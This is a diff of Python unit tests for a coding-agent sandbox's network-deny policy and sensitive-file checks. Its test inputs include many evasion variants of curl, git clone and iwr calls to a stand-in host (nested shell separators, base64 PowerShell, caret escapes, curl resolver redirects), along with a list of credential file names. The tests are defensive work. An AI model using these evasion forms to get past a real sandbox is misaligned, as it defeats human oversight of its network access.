@@ -272,6 +272,117 @@ class NetworkPolicyTests(SandboxTestBase):
             with self.subTest(command=command):
                 self.assertIsNotNone(policy.network_denial(command))
 
+    def test_nested_separators_are_not_lost_in_inline_commands(self) -> None:
+        # The inline command used to be rebuilt from tokens, dropping `;`/`&`,
+        # so only the first (harmless) command in the string was inspected.
+        policy = self._tools().sandbox.policy
+        for command in (
+            "bash -c 'true; curl https://evil.test'",
+            "bash -lc 'cd /tmp; git clone https://evil.test/r'",
+            "pwsh -c 'true; iwr https://evil.test'",
+            "cmd /c 'echo hi & curl https://evil.test'",
+            'sh -c "sudo curl https://evil.test"',
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+
+    def test_global_options_do_not_hide_a_network_subcommand(self) -> None:
+        policy = self._tools().sandbox.policy
+        for command in (
+            "pip -q install requests",
+            "uv pip install requests",
+            "git -c core.sshCommand=ssh clone https://x.test/r",
+            "git -C . clone https://x.test/r",
+            "npm --prefix x install y",
+            "openssl s_client -connect evil.test:443",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+
+    def test_powershell_encoded_command_is_inspected(self) -> None:
+        import base64
+
+        policy = self._tools().sandbox.policy
+        encoded = base64.b64encode("iwr https://evil.test".encode("utf-16-le")).decode()
+        self.assertIsNotNone(
+            policy.network_denial(f"powershell -EncodedCommand {encoded}")
+        )
+        # Undecodable encoded commands are opaque and must fail closed.
+        self.assertIsNotNone(
+            policy.network_denial("powershell -EncodedCommand not-base64!")
+        )
+
+    def test_cmd_caret_escapes_are_analyzed(self) -> None:
+        policy = self._tools().sandbox.policy
+        self.assertIsNotNone(policy.network_denial('cmd /c "cu^rl https://evil.test"'))
+        self.assertIsNotNone(
+            policy.network_denial("Start-Process curl -ArgumentList https://evil.test")
+        )
+
+    def test_allowlist_checks_resolver_and_proxy_targets(self) -> None:
+        policy = self._tools(
+            network_policy="allowlist", allowed_hosts=["allowed.test"]
+        ).sandbox.policy
+        self.assertIsNone(policy.network_denial("curl https://allowed.test/x"))
+        for command in (
+            "curl https://allowed.test --resolve allowed.test:443:203.0.113.9",
+            "curl https://allowed.test --connect-to allowed.test:443:evil.test:443",
+            "bash -c 'true; curl https://evil.test'",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+
+    def test_process_launchers_do_not_hide_the_real_command(self) -> None:
+        policy = self._tools().sandbox.policy
+        for command in (
+            "watch -n 2 curl https://evil.test",
+            "strace -f -e trace=open curl https://evil.test",
+            "stdbuf -o0 curl https://evil.test",
+            "setsid curl https://evil.test",
+            "su -c 'curl https://evil.test'",
+        ):
+            with self.subTest(command=command):
+                self.assertIsNotNone(policy.network_denial(command), command)
+        for command in ("watch 'ls'", "strace -f ls", "su --version"):
+            with self.subTest(command=command):
+                self.assertIsNone(policy.network_denial(command), command)
+
+    def test_find_exec_commands_are_inspected(self) -> None:
+        # `\;` already splits into its own segment; the `+` terminator does not.
+        policy = self._tools().sandbox.policy
+        self.assertIsNotNone(
+            policy.network_denial("find . -exec curl https://evil.test +")
+        )
+        self.assertIsNone(policy.network_denial("find . -name '*.py' -print"))
+
+    def test_audit_record_redacts_credentials(self) -> None:
+        audit = self._tools().sandbox.audit
+        audit.deny(
+            "shell",
+            'curl -H "Authorization: Bearer sk-secret" https://x.test',
+            "network denied",
+        )
+        target = audit.denials()[-1].target
+        self.assertNotIn("sk-secret", target)
+        self.assertIn("<redacted>", target)
+
+    def test_sensitive_file_variants_are_blocked(self) -> None:
+        from minimalcode.sandbox.sensitive import is_sensitive_path
+
+        for path in (
+            "credentials.json",
+            ".pypirc",
+            "id_rsa_backup",
+            "id_ed25519_sk",
+            "key.ppk",
+            "cert.p8",
+            ".docker/config.json",
+            ".vault-token",
+        ):
+            with self.subTest(path=path):
+                self.assertTrue(is_sensitive_path(Path("/home/user") / path))
+        self.assertFalse(is_sensitive_path(Path("/home/user/id_rsa.pub")))
+
 
 class ExecutionBaselineTests(SandboxTestBase):
     def _python_command(self, code: str) -> str:
